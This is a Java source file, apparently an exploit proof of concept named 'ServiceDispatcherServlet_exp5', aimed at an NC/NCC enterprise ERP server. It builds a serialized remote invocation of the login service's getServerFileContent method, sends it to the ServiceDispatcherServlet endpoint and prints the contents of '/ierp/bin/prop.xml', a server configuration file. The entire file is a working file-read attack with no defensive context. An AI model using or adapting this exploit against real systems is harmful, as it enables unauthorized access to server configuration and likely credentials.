import nc.bs.framework.common.InvocationInfo;
import nc.bs.framework.comn.Result;
import nc.bs.framework.exception.ConnectorException;
import nc.bs.framework.rmi.Address;
import nc.bs.framework.rmi.RemoteChannel;
import nc.bs.framework.rmi.RemoteChannelFactory;
import nc.bs.framework.rmi.RemoteChannelFactoryManager;
import org.apache.commons.codec.digest.DigestUtils;


public class ServiceDispatcherServlet_exp5 {
    public static void main(String[] args) throws Throwable {
        //
        System.setProperty("ncc.myLine","true");
        InvocationInfo invocationInfo = new InvocationInfo("->nc.login.bs.INCLoginService","getServerFileContent",new Class[]{String.class},new Object[]{
                "/ierp/bin/prop.xml"
        },"2222222");
        Address target = new Address("http://127.0.0.1:40888/ServiceDispatcherServlet");
//        RemoteChannelFactory rcf = RemoteChannelFactoryManager.getDefault().getRemoteChannelFactory(target.getProtocol());
        HttpRemoteChannelFactory rcf = new HttpRemoteChannelFactory();
        if (rcf == null) {
            throw new ConnectorException("not support target address:" + target);
        } else {
            RemoteChannel rc = null;
            Result ret = null;

            Object var19;
            try {

                rc = rcf.createRemoteChannel(target);
                rc.init();
                RemoteUtil.writeObject(rc.getOutputStream(), invocationInfo);
                ret = (Result) RemoteUtil.readObject(rc.getInputStream(), (boolean[])null);
                if (ret.appexception != null) {
                    throw ret.appexception;
                }

                var19 = ret.result;
            }  finally {
                if (rc != null) {
                    rc.destroy();
                }
            }
            System.out.println(new String((byte[])var19));
        }

    }
}
